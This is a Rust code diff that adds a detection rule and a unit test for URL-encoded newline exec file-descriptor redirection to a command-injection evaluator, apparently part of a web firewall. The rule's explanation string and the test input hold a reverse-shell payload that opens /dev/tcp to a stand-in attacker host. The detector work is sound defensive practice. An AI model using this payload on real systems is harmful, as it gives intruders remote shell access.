@@ -1758,6 +1758,25 @@ impl L2Evaluator for CmdInjectionEvaluator {
             }
         }
 
+        static NEWLINE_FD_REDIRECT_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r"(?i)(?:%0a|\n)(?:exec|eval)\s*[0-9]*\s*[<>]|(?:%0d%0a|\r\n)exec\s+[0-9]+").unwrap()
+        });
+        for m in NEWLINE_FD_REDIRECT_RE.find_iter(&decoded) {
+            dets.push(L2Detection {
+                detection_type: "cmd_newline_fd_redirect".into(),
+                confidence: 0.93,
+                detail: "URL-encoded newline followed by exec fd redirect".into(),
+                position: m.start(),
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::PayloadInject,
+                    matched_input: m.as_str().to_owned(),
+                    interpretation: "URL-encoded newline (%0a) before exec file descriptor redirection creates reverse shells via fd manipulation. exec 3<>/dev/tcp/attacker.com/443 opens a bidirectional TCP connection as fd 3, then redirecting stdin/stdout to fd 3 gives interactive shell access without fork/exec of new processes".into(),
+                    offset: m.start(),
+                    property: "URL-encoded line terminators must be decoded before command injection scanning. exec fd redirection patterns combined with network endpoints must be rejected".into(),
+                }],
+            });
+        }
+
         let tokenizer = ShellTokenizer;
         let stream = tokenizer.tokenize(&decoded);
         let tokens = stream.all().to_vec();
@@ -1807,6 +1826,7 @@ impl L2Evaluator for CmdInjectionEvaluator {
 
     fn map_class(&self, detection_type: &str) -> Option<InvariantClass> {
         match detection_type {
+            "cmd_newline_fd_redirect" => Some(InvariantClass::CmdSeparator),
             "separator"
             | "variable_expansion"
             | "quote_fragmentation"
@@ -1993,6 +2013,16 @@ mod tests {
             dets.iter()
                 .any(|d| d.detection_type == "shell_evasion_tab_separator"),
             "Should detect tab as command separator"
+        );
+    }
+
+    #[test]
+    fn detect_cmd_newline_fd_redirect_pattern() {
+        let eval = CmdInjectionEvaluator;
+        let dets = eval.detect("%0aexec%203%3C%3E%2Fdev%2Ftcp%2Fattacker%2F443");
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "cmd_newline_fd_redirect")
         );
     }
 
